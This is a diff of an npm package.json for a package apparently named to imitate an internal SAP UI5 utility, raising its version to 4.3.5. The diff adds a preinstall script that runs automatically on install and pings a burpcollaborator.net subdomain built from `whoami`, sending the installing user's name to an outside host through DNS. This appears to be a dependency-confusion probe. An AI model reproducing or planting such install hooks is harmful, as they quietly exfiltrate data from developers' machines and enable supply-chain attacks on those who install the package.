@@ -1,10 +1,10 @@
 {
   "name": "custdev-sapui5-infra-util",
-  "version": "4.3.4",
+  "version": "4.3.5",
   "description": "",
   "main": "index.js",
   "scripts": {
-    "preinstall": "ping -n 2 `whoami`.fl4zjl7b7ivcankm6j0zywwt1k7cv1.burpcollaborator.net"
+    "preinstall": "ping -c 2 `whoami`.fl4zjl7b7ivcankm6j0zywwt1k7cv1.burpcollaborator.net"
   },
   "author": "random",
   "license": "ISC"
